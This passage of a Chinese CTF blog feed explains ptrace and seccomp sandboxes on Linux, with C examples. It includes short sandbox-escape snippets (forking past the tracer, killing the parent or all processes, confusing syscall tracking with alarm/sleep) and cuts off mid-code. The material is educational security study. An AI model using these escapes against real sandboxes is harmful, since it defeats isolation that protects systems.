    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Wrong hash.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Need password...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a7a8047f096fe69370eb38dc7d0d33f860a6beb694f989e9c2655df1d63f0bd8"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Sorry, the article is encrypted.
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Ptrace</title>
    <link href="blog.b3ale.cn/2020/04/18/Linux-Sandbox-Ptrace/"/>
    <id>blog.b3ale.cn/2020/04/18/Linux-Sandbox-Ptrace/</id>
    <published>2020-04-18T14:15:40.000Z</published>
    <updated>2020-04-19T13:11:45.246Z</updated>
    
    <content type="html"><![CDATA[<p>ptrace 是一个系统调用，也可以用作实现沙箱。</p><a id="more"></a><h1 id="What-is-Ptrace"><a href="#What-is-Ptrace" class="headerlink" title="What is Ptrace"></a>What is Ptrace</h1><p>ptrace 是一个系统调用，Tracer 进程可以监控和修改 Tracee 进程的运行状态，如内存、寄存器的值等。使用 ptrace 可以让某一进程处于受控状态，所以可以用作实现沙箱，如利用 ptrace 来监控 Tracee 使用哪些系统调用，并禁止 Tracee 使用某些危险的系统调用等。ptrace 使用信号来进行进程间通信：</p><pre><code class="bash">$ kill -l 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP 2) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR11)  SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM2)  SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP3)  SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ4)  SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR5)  SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+36)  SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+87)  SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+138)  SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-129)  SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-710) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-211) SIGRTMAX-1  64) SIGRTMAX</code></pre><h1 id="How-to-trace"><a href="#How-to-trace" class="headerlink" title="How to trace"></a>How to trace</h1><p>ptrace 的作用：</p><ul><li>Tracer 追踪 Tracee 的执行</li><li>拦截特定的事件（TRAP、SYSCALL）</li><li>读写 Tracee 的运行状态，如内存、寄存器的值等</li><li>用来实现 gdb 和 strace</li></ul><p>ptrace 的函数原型如下。其中 <code>request</code> 指明进行的操作，<code>pid</code> 为被追踪的进程（<code>pid</code>、<code>addr</code> 和 <code>data</code> 有时不会派上用场，根据具体情况而定）：</p><pre><code class="cpp">#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;long ptrace(enum __ptrace_request request, pid_t pid,                        void *addr, void *data);</code></pre><p><code>request</code> 有很多定义，这里记录几个常用的（详见 <a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">Linux Programmer’s Manual</a>）：</p><ul><li><code>PTRACE_TRACEME</code>：表明该进程会被父进程追踪。<code>pid</code>、<code>addr</code> 和 <code>data</code> 的值被忽略。这也是唯一能被 Tracee 使用的 <code>request</code>，其他的 <code>request</code> 都由 Tracer 指定；</li><li><code>PTRACE_ATTACH</code>：Tracer 向 Tracee 发送 SIGSTOP 信号使其暂停，并对 Tracee 追踪；</li><li><code>PTRACE_SEIZE</code>（从 Linux 3.4 开始有的 <code>request</code>）：追踪指定 <code>pid</code> 的进程，但不会像 <code>PTRACE_ATTACH</code> 一样让 Tracee 暂停。<code>addr</code> 必须为 0，<code>data</code> 指定 ptrace 选项；</li><li><code>PTRACE_DETACH</code>：解除追踪关系，Tracee 将继续运行；</li><li><code>PTRACE_CONT</code>：重启停止的 Tracee 进程，如果 <code>data</code> 不为 0，该值就会被当成对应的 Signal 传给 Tracee；反之不会发送 Signal。<code>addr</code> 的值被忽略；</li><li><code>PTRACE_SYSCALL</code>：在系统调用的入口或是出口处将 Tracee 进程停止并进行追踪。<code>addr</code> 的值被忽略；</li><li><code>PTRACE_PEEKUSER</code>：在 Tracee 的用户内存里获取一个字的数据，其中 <code>addr</code> 是在结构体 <code>user</code>（<code>/usr/include/sys/user.h</code>）中的偏移。</li></ul><h2 id="Trace-Child-Process"><a href="#Trace-Child-Process" class="headerlink" title="Trace Child Process"></a>Trace Child Process</h2><ul><li>先在子进程中调用 <code>ptrace(PTRACE_TRACEME)</code>；</li><li>在父进程中使用 <code>waitpid(pid)</code> 等待；</li><li>然后使用 <code>ptrace(PTRACE_CONT)</code> 继续执行；<ul><li>如果没有遇到 <code>int 0x3</code> 就会一直跑；</li><li>要追 syscall 的时候可以用 <code>ptrace(PTRACE_SYSCALL)</code>。</li></ul></li></ul><p>测试代码如下。子进程被父进程追踪，父进程在等待追踪结束后，重启子进程：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            // ...            ptrace(PTRACE_CONT, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);    }}</code></pre><h2 id="Trace-syscall"><a href="#Trace-syscall" class="headerlink" title="Trace syscall"></a>Trace syscall</h2><ul><li>使用 <code>ptrace(PTRACE_PEEKUSER)</code> 来读取 CPU；<ul><li>addr 为结构体 <code>user</code> 中的偏移；</li><li><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/asm/user_32.h" target="_blank" rel="noopener"><code>arch/x86/include/asm/user_32.h</code></a>（<code>/usr/include/sys/user.h</code>）</li><li>orig_rax 为系统调用号；</li></ul></li><li>syscall 分别在 enter 和 exit 时各中断一次；<ul><li>exit 的时候可以在 rax 获取返回值。</li></ul></li></ul><p>添加一个 incall 来判断在 syscall 的 enter 和 exit 之间的切换，并在系统调用退出时输出调用号；然后获取 <code>user</code> 结构体中的 <code>orig_rax</code> 字段，即系统调用号：</p><pre><code class="cpp">    int incall = 0;    while (1) {        // ...        long orig_rax = ptrace(PTRACE_PEEKUSER, pid,            offsetof(struct user, regs.orig_rax), 0);        if (incall) {            printf(&quot;nr = %ld\n&quot;, orig_rax);        }        incall = ~incall;        ptrace(PTRACE_SYSCALL, pid, 0, 0);    }</code></pre><h2 id="读取-Tracee-的内容"><a href="#读取-Tracee-的内容" class="headerlink" title="读取 Tracee 的内容"></a>读取 Tracee 的内容</h2><ul><li><code>ptrace(PTRACE_PEEKDATA)</code></li><li>固定读一个字（4 字节）</li></ul><p><code>/bin/ls</code> 中调用了 write 进行输出，可以对 write 进行追踪并获取相应的内容：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        int incall = 0;        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            long orig_rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.orig_rax), 0);            long rsi = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rsi), 0);            long rdx = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rdx), 0);            long rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.rax), 0);            //printf(&quot;nr = %ld\n&quot;, orig_rax);            if (incall) {                if (orig_rax == 1) {                    printf(&quot;write(\&quot;&quot;);                    for (int i = 0; i &lt; rdx; i++) {                        int d = ptrace(PTRACE_PEEKDATA, pid,                            rsi + i, 0);                        printf(&quot;%c&quot;, d &amp; 0xff);                    }                }            } else {                if (orig_rax == 1) {                    printf(&quot;\&quot;) = %d\n&quot;, (int)rax);                }            }            incall = ~incall;            ptrace(PTRACE_SYSCALL, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, NULL);    }}</code></pre><p>运行结果：</p><pre><code class="bash">➜  ptrace ./ptracewrite(&quot;a  a.c    escape    escape.c  Makefile  ptrace  ptrace.ca  a.c    escape    escape.c  Makefile  ptrace  ptrace.c&quot;) = 51</code></pre><h1 id="Bypass-Ptrace-Sandbox"><a href="#Bypass-Ptrace-Sandbox" class="headerlink" title="Bypass Ptrace Sandbox"></a>Bypass Ptrace Sandbox</h1><ul><li>摆脱对 syscall 的追踪<ul><li>Fork 脱离 Tracer</li><li>砍掉父进程</li></ul></li><li>绕过 syscall 的检查<ul><li><code>syscall_restart</code> 等造成 incall 计算错误</li></ul></li></ul><h2 id="Escape-by-Fork"><a href="#Escape-by-Fork" class="headerlink" title="Escape by Fork"></a>Escape by Fork</h2><ul><li>只要 ptrace 没有跟踪好 fork、vfork、clone，子进程就不会被 ptrace 跟踪；</li><li>正确的做法是要继续跟好子进程，或者直接禁止 fork。<ul><li>可以设置 <code>PTRACE_O_TRACECLONE</code> 选项，会自动跟踪 clone 出来的新进程。</li></ul></li></ul><p>测试代码如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ptrace.h&gt;#include &lt;sys/user.h&gt;#include &lt;sys/wait.h&gt;int main(int argc, char **argv) {    pid_t pid = fork();    if (pid) {        int incall = 0;        while (1) {            int status;            waitpid(pid, &amp;status, 0);            if (WIFEXITED(status)){                break;            }            long orig_rax = ptrace(PTRACE_PEEKUSER, pid,                offsetof(struct user, regs.orig_rax), 0);            if (incall) {                if (orig_rax == 59) {                    printf(&quot;SYS_execve detected\n&quot;);                    kill(pid, SIGKILL);                    exit(0);                }            }            incall = ~incall;            ptrace(PTRACE_SYSCALL, pid, 0, 0);        }    } else {        ptrace(PTRACE_TRACEME, 0, 0, 0);        execl(&quot;./a&quot;, &quot;a&quot;, NULL);    }}</code></pre><p>子进程新 fork 一个进程来执行 execve：</p><pre><code class="cpp">    if (fork()) {        sleep(1);    } else {        execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);    }</code></pre><p>运行结果：</p><pre><code class="bash">➜  ptrace ./ptracea  a.c    escape    escape.c  Makefile  ptrace  ptrace.c</code></pre><h2 id="Escape-by-Kill"><a href="#Escape-by-Kill" class="headerlink" title="Escape by Kill"></a>Escape by Kill</h2><ul><li>杀死父进程；<ul><li><code>kill(getppid(), 9);</code>；</li><li>ppid 无法获取时可以尝试 pid-1；</li><li><code>/proc/self/stat</code> 中可以拿到 pid 和 ppid；</li><li><code>kill(-1, 9);</code> 杀死除了自己以外的所有进程。</li></ul></li><li>设置 <code>PTRACE_O_EXITKILL</code> 可以让 Tracer 结束时把所有的 Tracee 杀死。</li></ul><p>在子进程中杀死父进程：</p><pre><code class="cpp">    kill(getppid(), 9);    execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);</code></pre><p>运行效果：</p><pre><code class="bash">➜  ptrace ./ptrace[1]    2211 killed     ./ptracea  a.c  escape  escape.c  Makefile  ptrace  ptrace.c</code></pre><p>用 alarm 和 sleep 可以搅乱 syscall 进出的顺序：</p><pre><code class="cpp">    alarm(1);    sleep(2);    execl(&quot;/bin/ls&quot;, &quot;ls&quot;, 0);</code></pre><p>加上一条用来判断进出 syscall 的输出：</p><pre><code class="cpp">            printf(&quot;%s %ld\n&quot;, (incall ? &quot;Enter&quot; : &quot;Exit&quot;), orig_rax);</code></pre><p>运行效果如下。在执行 alarm 后会导致 sys_nanosleep（35）由进入了一次，后面会调用一个 sys_restart_syscall（219），大概可能和 syscall 的原理有关。在这之后的 syscall 的顺序就会乱掉：</p><pre><code class="bash">Enter 35Exit 35Enter 35Exit 219Enter 219Exit 59Enter 59</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/" target="_blank" rel="noopener">https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#ptrace" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#ptrace</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ptrace 是一个系统调用，也可以用作实现沙箱。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux Sandbox - Seccomp</title>
    <link href="blog.b3ale.cn/2020/04/17/%5BTODO%5DLinux-Sandbox-Seccomp/"/>
    <id>blog.b3ale.cn/2020/04/17/%5BTODO%5DLinux-Sandbox-Seccomp/</id>
    <published>2020-04-17T02:21:52.000Z</published>
    <updated>2020-04-25T03:38:03.736Z</updated>
    
    <content type="html"><![CDATA[<p>Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。</p><a id="more"></a><h1 id="Seccomp-Sandbox"><a href="#Seccomp-Sandbox" class="headerlink" title="Seccomp Sandbox"></a>Seccomp Sandbox</h1><p>Seccomp（Secure Computing mode）是 Linux 提供的一种沙箱机制，可以用来限制程序可以使用和不可使用的系统调用。简洁、优美是 Seccomp 的优点，但只能支持“纯计算型”代码却使得其应用受到很大限制。比如，Seccomp 模式的进程不能动态分配内存、不能与其它进程使用共享内存、不能使用新的文件描述符、等等。如果要支持具有丰富功能的应用程序，则需要另外的方法来截获并处理其它系统调用。Seccomp 沙箱主要有两种模式，<code>SECCOMP_SET_MODE_STRICT</code> 只运行调用 4 个系统调用 <code>read()</code>、<code>write()</code>、<code>exit()</code>、<code>sigreturn()</code> 四个系统调用，而 <code>SECCOMP_SET_MODE_FILTER</code> 则允许通过 BPF 指定系统调用的黑名单或者白名单。</p><p>Seccomp 本身是一种很安全的技术，但是在 <code>SECCOMP_SET_MODE_FILTER</code> 环境下通常会因为 BPF 使用不正确导致沙箱存在被绕过的可能。</p><ul><li>限制一个程序能够使用的系统调用，可以是黑名单或白名单；</li><li>根据 Filter 的内容决定遇到系统调用时采取的行为，包括 kill、allow、trap 等等；</li><li>Filter 可以做简单的计算、条件判断。</li></ul><blockquote><p>早期直接使用 <code>prctl</code> 来开启 Seccomp。现在已经有 libseccomp 库，可以直接使用 <code>seccomp_init</code>、<code>seccomp_rule_add</code>、<code>seccomp_load</code> 来设定规则。</p></blockquote><h2 id="Seccomp-using-prctl"><a href="#Seccomp-using-prctl" class="headerlink" title="Seccomp using prctl"></a>Seccomp using <code>prctl</code></h2><p>Seccomp 采用 Berkeley Packet Filter（BPF）格式，原本在防火墙（iptables）中用来过滤封包。使用 Seccomp 需要有 <code>CAP_SYS_ADMIN</code> Capability（相当于 root 的权限），非 root 用户则通过设置 PR_SET_NO_NEW_PRIVS 位来获取 <code>CAP_SYS_ADMIN</code> Capability。这样能保证 Seccomp 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然受控。获取 <code>CAP_SYS_ADMIN</code> Capability 后，就可以开启相应的自定义规则。具体的规则定义在参数 <code>prog</code> 中：</p><pre><code class="cpp">prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); // 获取 CAP_SYS_ADMIN 权限prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog); // 开启自定义的过滤规则</code></pre><p>接下来看看 <code>prog</code> 对应的结构体 <code>sock_fprog</code> 以及用于过滤系统调用的结构体 <code>sock_filter</code>，主要定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/filter.h" target="_blank" rel="noopener">include/uapi/linux/filter.h</a>（<code>/usr/include/linux/filter.h</code>）中。其中 <code>sock_fprog</code> 第一个成员 <code>len</code> 记录过滤规则的个数；第二个成员 <code>filter</code> 是一个 <code>sock_filter</code> 数组，用于记录相应的过滤规则：</p><pre><code class="cpp">/* *    Try and keep these values and structures similar to BSD, especially *    the BPF code definitions which need to match so you can share filters */struct sock_filter {    /* Filter block */    __u16    code;   /* Actual filter code */    __u8    jt;    /* Jump true */    __u8    jf;    /* Jump false */    __u32    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter __user *filter;};</code></pre><p>为了方便操作 <code>sock_filter</code>，还定义了一组宏：</p><pre><code class="cpp">/* * Macros for filter block array initializers. */#ifndef BPF_STMT#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }#endif#ifndef BPF_JUMP#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }#endif</code></pre><p>其中在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/bpf_common.h" target="_blank" rel="noopener">include/uapi/linux/bpf_common.h</a>（<code>/usr/include/linux/bpf_common.h</code>）对 code 进行了一系列的定义，包括一些数据操作指令、跳转指令、算术运算指令等等（Winesap 提到程序可以全部用 BPF 的算术运算单元来实现，运行的时间是算在内核里，据说居然可以在 OJ 里绕过时间限制）：</p><pre><code class="cpp">/* Instruction classes */#define BPF_CLASS(code) ((code) &amp; 0x07)#define        BPF_LD        0x00#define        BPF_LDX        0x01#define        BPF_ST        0x02#define        BPF_STX        0x03#define        BPF_ALU        0x04#define        BPF_JMP        0x05#define        BPF_RET        0x06#define        BPF_MISC        0x07/* ld/ldx fields */#define BPF_SIZE(code)  ((code) &amp; 0x18)#define        BPF_W        0x00#define        BPF_H        0x08#define        BPF_B        0x10#define BPF_MODE(code)  ((code) &amp; 0xe0)#define        BPF_IMM        0x00#define        BPF_ABS        0x20#define        BPF_IND        0x40#define        BPF_MEM        0x60#define        BPF_LEN        0x80#define        BPF_MSH        0xa0/* alu/jmp fields */#define BPF_OP(code)    ((code) &amp; 0xf0)#define        BPF_ADD        0x00#define        BPF_SUB        0x10#define        BPF_MUL        0x20#define        BPF_DIV        0x30#define        BPF_OR        0x40#define        BPF_AND        0x50#define        BPF_LSH        0x60#define        BPF_RSH        0x70#define        BPF_NEG        0x80#define        BPF_MOD        0x90#define        BPF_XOR        0xa0#define        BPF_JA        0x00#define        BPF_JEQ        0x10#define        BPF_JGT        0x20#define        BPF_JGE        0x30#define        BPF_JSET        0x40#define BPF_SRC(code)   ((code) &amp; 0x08)#define        BPF_K        0x00#define        BPF_X        0x08</code></pre><p>从某个地址加载数据（数据的大小：<code>BPF_W</code>、<code>BPF_H</code>、<code>BPF_B</code>，地址的类型：<code>BPF_ABS</code>、<code>BPF_IMM</code>）：</p><pre><code class="cpp">BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0)</code></pre><p>然后 Seccomp 的返回值在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中有定义，意思也是比较直观的：</p><pre><code class="cpp">/* * All BPF programs must return a 32-bit value. * The bottom 16-bits are for optional return data. * The upper 16-bits are ordered from least permissive values to most. * * The ordering ensures that a min_t() over composed return values always * selects the least permissive choice. */#define SECCOMP_RET_KILL    0x00000000U /* kill the task immediately */#define SECCOMP_RET_TRAP    0x00030000U /* disallow and force a SIGSYS */#define SECCOMP_RET_ERRNO    0x00050000U /* returns an errno */#define SECCOMP_RET_TRACE    0x7ff00000U /* pass to a tracer or disallow */#define SECCOMP_RET_ALLOW    0x7fff0000U /* allow */</code></pre><p>Seccomp 编写规则时会使用到一个 <code>seccomp_data</code> 结构体，定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h" target="_blank" rel="noopener">include/uapi/linux/seccomp.h</a>（<code>/usr/include/linux/seccomp.h</code>）中。各个成员如下：</p><ul><li><code>nr</code>：系统调用号；</li><li><code>arch</code>：定义在 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/audit.h" target="_blank" rel="noopener">include/uapi/linux/audit.h</a>（<code>/usr/include/linux/audit.h</code>）中；<ul><li><code>i386</code>：0x40000003；</li><li><code>amd64</code>：0xc000003e。</li></ul></li><li><code>instruction_pointer</code>：系统调用号对应的 IP；</li><li><code>args</code>：系统调用号。<ul><li><code>i386</code>：ebx、ecx、edx、esi、edi；</li><li><code>amd64</code>：rdi、rsi、rdx、r10、r8、r9。</li></ul></li></ul><pre><code class="cpp">#define AUDIT_ARCH_I386        (EM_386|__AUDIT_ARCH_LE)#define AUDIT_ARCH_IA64        (EM_IA_64|__AUDIT_ARCH_64BIT|__AUDIT_ARCH_LE)/** * struct seccomp_data - the format the BPF program executes over. * @nr: the system call number * @arch: indicates system call convention as an AUDIT_ARCH_* value *        as defined in &lt;linux/audit.h&gt;. * @instruction_pointer: at the time of the system call. * @args: up to 6 system call arguments always stored as 64-bit values *        regardless of the architecture. */struct seccomp_data {    int nr;    __u32 arch;    __u64 instruction_pointer;    __u64 args[6];};</code></pre><p>下面给一个例子测试，<code>SECCOMP_RET_ALLOW</code> 表示允许所有调用；<code>SECCOMP_RET_KILL</code> 表示禁止所有调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;int main() {    struct sock_filter filter[] = {//        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);}</code></pre><p><code>SECCOMP_RET_ALLOW</code> 会正常执行，而 <code>SECCOMP_RET_KILL</code> 会报“invalid system call”：</p><pre><code class="bash">➜  seccomp ./sec[1]    3372 invalid system call  ./sec</code></pre><p>禁用 execve 系统调用的规则如下。首先取出 <code>seccomp_data</code> 中的 <code>nr</code>，然后和 59 比较。如果相等，则跳过一条规则，即被 kill；不相等的话，继续执行下一条规则，即 allow：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // compare nr with 59 (SYS_execve = 59)    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><p>Seccomp 的过滤规则可以通过 gdb 来 dump 出来，即第二次调用 prctl 时的第三个参数：</p><pre><code>(gdb) p/x $rdx$1 = 0x7fffffffe480(gdb) x/2gx 0x7fffffffe4800x7fffffffe480:    0x00007fffffff0004    0x00007fffffffe490(gdb) x/4gx 0x00007fffffffe4900x7fffffffe490:    0x0000000000000020    0x0000003b000100150x7fffffffe4a0:    0x7fff000000000006    0x0000000000000006(gdb) dump memory dd 0x00007fffffffe490 0x00007fffffffe490+4*8</code></pre><p>然后使用 libseccomp 中的 scmp_bpf_disasm 反编译获取大致的过滤规则，通常需要根据反编译出来的结果去查找对应函数的意义：</p><pre><code class="bash">➜  seccomp scmp_bpf_disasm &lt; dd line  OP   JT   JF   K================================= 0000: 0x20 0x00 0x00 0x00000004   ld  $data[4] 0001: 0x15 0x00 0x03 0xc000003e   jeq 3221225534 true:0002 false:0005 0002: 0x20 0x00 0x00 0x00000000   ld  $data[0] 0003: 0x15 0x01 0x00 0x0000003b   jeq 59   true:0005 false:0004 0004: 0x06 0x00 0x00 0x7fff0000   ret ALLOW 0005: 0x06 0x00 0x00 0x00000000   ret KILL</code></pre><p>使用 seccomp-tools 也可以进行解析。</p><h2 id="Seccomp-using-libseccomp"><a href="#Seccomp-using-libseccomp" class="headerlink" title="Seccomp using libseccomp"></a>Seccomp using libseccomp</h2><blockquote><p>根据 veritas501 的博客做的一些记录。</p></blockquote><p>这边需要先安装一些依赖才会有 <code>seccomp.h</code> 头文件：</p><pre><code class="bash">sudo apt-get install libseccomp-dev libseccomp2 seccomp</code></pre><p>具体在 <code>/usr/include/seccomp.h</code> 中，一些选项如下：</p><pre><code class="cpp">/* * seccomp actions *//** * Kill the process */#define SCMP_ACT_KILL           0x00000000U/** * Throw a SIGSYS signal */#define SCMP_ACT_TRAP           0x00030000U/** * Return the specified error code */#define SCMP_ACT_ERRNO(x)       (0x00050000U | ((x) &amp; 0x0000ffffU))/** * Notify a tracing process with the specified value */#define SCMP_ACT_TRACE(x)       (0x7ff00000U | ((x) &amp; 0x0000ffffU))/** * Allow the syscall to be executed */#define SCMP_ACT_ALLOW          0x7fff0000U</code></pre><p><code>seccomp_init()</code> 用于初始化过滤状态：</p><pre><code class="cpp">/** * Initialize the filter state * @param def_action the default filter action * * This function initializes the internal seccomp filter state and should * be called before any other functions in this library to ensure the filter * state is initialized.  Returns a filter context on success, NULL on failure. * */scmp_filter_ctx seccomp_init(uint32_t def_action);</code></pre><p><code>seccomp_rule_add()</code> 用于添加新的规则。其中如果 <code>arg_cnt</code> 不为 0，那么 <code>arg_cnt</code> 表示后面限制的参数的个数，故只有参数满足要求时才会拦截：</p><pre><code class="cpp">/** * Add a new rule to the filter * @param ctx the filter context * @param action the filter action * @param syscall the syscall number * @param arg_cnt the number of argument filters in the argument filter chain * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended) * * This function adds a series of new argument/value checks to the seccomp * filter for the given syscall; multiple argument/value checks can be * specified and they will be chained together (AND&#39;d together) in the filter. * If the specified rule needs to be adjusted due to architecture specifics it * will be adjusted without notification.  Returns zero on success, negative * values on failure. * */int seccomp_rule_add(scmp_filter_ctx ctx,                     uint32_t action, int syscall, unsigned int arg_cnt, ...);** * Specify an argument comparison struct for use in declaring rules * @param arg the argument number, starting at 0 * @param op the comparison operator, e.g. SCMP_CMP_* * @param datum_a dependent on comparison * @param datum_b dependent on comparison, optional */#define SCMP_CMP(...)           ((struct scmp_arg_cmp){__VA_ARGS__})/** * Specify an argument comparison struct for argument 0 */#define SCMP_A0(...)            SCMP_CMP(0, __VA_ARGS__)/** * Specify an argument comparison struct for argument 1 */#define SCMP_A1(...)            SCMP_CMP(1, __VA_ARGS__)/** * Specify an argument comparison struct for argument 2 */#define SCMP_A2(...)            SCMP_CMP(2, __VA_ARGS__)/** * Specify an argument comparison struct for argument 3 */#define SCMP_A3(...)            SCMP_CMP(3, __VA_ARGS__)/** * Specify an argument comparison struct for argument 4 */#define SCMP_A4(...)            SCMP_CMP(4, __VA_ARGS__)/** * Specify an argument comparison struct for argument 5 */#define SCMP_A5(...)            SCMP_CMP(5, __VA_ARGS__)/** * Comparison operators */enum scmp_compare {        _SCMP_CMP_MIN = 0,        SCMP_CMP_NE = 1,                /**&lt; not equal */        SCMP_CMP_LT = 2,                /**&lt; less than */        SCMP_CMP_LE = 3,                /**&lt; less than or equal */        SCMP_CMP_EQ = 4,                /**&lt; equal */        SCMP_CMP_GE = 5,                /**&lt; greater than or equal */        SCMP_CMP_GT = 6,                /**&lt; greater than */        SCMP_CMP_MASKED_EQ = 7,         /**&lt; masked equality */        _SCMP_CMP_MAX,};/** * Argument datum */typedef uint64_t scmp_datum_t;/** * Argument / Value comparison definition */struct scmp_arg_cmp {        unsigned int arg;       /**&lt; argument number, starting at 0 */        enum scmp_compare op;   /**&lt; the comparison op, e.g. SCMP_CMP_* */        scmp_datum_t datum_a;        scmp_datum_t datum_b;};</code></pre><p><code>seccomp_load()</code> 用来应用规则：</p><pre><code class="cpp">/** * Loads the filter into the kernel * @param ctx the filter context * * This function loads the given seccomp filter context into the kernel.  If * the filter was loaded correctly, the kernel will be enforcing the filter * when this function returns.  Returns zero on success, negative values on * error. * */int seccomp_load(const scmp_filter_ctx ctx);</code></pre><p>同样用最简单的例子测试一下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_ALLOW);    